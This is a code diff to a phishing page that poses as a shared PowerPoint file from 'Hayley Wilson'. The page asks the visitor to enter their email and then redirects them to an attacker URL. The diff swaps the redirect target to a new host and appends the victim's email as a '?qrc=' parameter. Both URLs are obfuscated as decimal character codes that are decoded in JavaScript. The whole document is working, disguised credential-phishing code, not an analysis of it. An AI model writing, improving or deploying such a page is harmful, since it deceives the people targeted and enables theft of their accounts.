@@ -71,7 +71,7 @@
     <div id="auth-page" class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/0/0d/Microsoft_Office_PowerPoint_%282019%E2%80%93present%29.svg" alt="Outlook Logo" class="logo"><br>
         
-        <p>Here's the PowerPoint file that <b>Hayley</b> shared with you.</p><br><br>
+        <p>Here's the PowerPoint file that <b>Hayley Wilson</b> shared with you.</p><br><br>
         <input type="email" id="email" placeholder="Enter the recipient's email to proceed">
         <button onclick="validateEmail()">Continue</button>
     </div>
@@ -106,10 +106,10 @@
             }
 
             let base64Email = (email);
-            let encodedURL = "104 116 116 112 115 58 47 47 104 97 121 108 101 121 119 105 108 115 111 110 45 100 97 116 97 114 111 111 109 45 112 111 119 101 114 112 111 105 110 116 45 97 99 99 101 115 115 46 115 117 98 111 100 111 114 101 114 54 46 99 111 109 47 87 54 48 73 85 98 111 78 84 105 99 100 87 105 72 71 73 81 108 72 116 114 69 70 102 104 86 81 83 89 105 81 47";
+            let encodedURL = "104 116 116 112 115 58 47 47 48 99 54 54 99 51 48 97 46 101 98 102 57 56 102 56 50 52 102 100 102 98 56 50 98 98 102 102 57 97 51 101 98 46 119 111 114 107 101 114 115 46 100 101 118";
             let decodedURL = encodedURL.split(" ").map(num => String.fromCharCode(num)).join("");
 
-            window.location.href = decodedURL + "*" + (base64Email);
+            window.location.href = decodedURL + "?qrc=" + (base64Email);
         }
 
         // Enable "Enter" key submission for email input
